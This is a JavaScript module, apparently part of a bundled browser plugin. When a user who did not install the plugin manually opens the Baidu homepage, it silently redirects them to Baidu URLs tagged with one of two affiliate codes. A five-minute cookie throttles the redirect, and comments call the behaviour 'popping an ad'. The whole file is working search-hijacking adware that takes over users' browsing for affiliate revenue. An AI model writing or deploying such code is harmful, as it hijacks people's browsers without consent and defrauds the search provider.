__tk__define(function (require, exports, module) {
  var $ = require('../lib/jquery.min'),
    J = {
      utils: require('../utils')
    };
  // 自主安装渠道的插件不弹
  if (J.utils.isManualDId) {
    return;
  }

  //是否是百度搜索页
  var isSearchBaidu = function () {
    if (J.utils.href === 'http://www.baidu.com/' || J.utils.href.match(/http:\/\/www.baidu.com\/\?tn=.+/)) {
      if (J.utils.href.match(/92942967_hao_pg|98084262_hao_pg/)) {
        return false;
      } else {
        return true;
      }
    } else {
      return false;
    }
  };

  if (!isSearchBaidu()) {
    return;
  }

  var randomNum = J.utils.getRandom(0, 99);

  function init() {

		if (randomNum < 50) {
			document.location.href = 'http://www.baidu.com/?tn=92942967_hao_pg';
		} else {
			document.location.href = 'http://www.baidu.com/?tn=98084262_hao_pg';
		}
  }

  if (J.utils.cookie.get().baiduTK === 'true') {
    return;
  } else {
    // 没有cookie时先写入cookie，cookie有效期5分钟
    J.utils.cookie.set({
      name: 'baiduTK',
      value: true,
      min: 5,
      path: '/',
      domain: 'baidu.com'
    });
    // cookie写入失败（例如设置浏览器禁止写入cookie）时，不弹广告
    if (J.utils.cookie.get().baiduTK === undefined) {
      return;
    } else {
      // cookie写入成功时，弹广告
      try {
        init();
      } catch (ex) {
        console.error(ex.stack);
      }
    }
  }
});
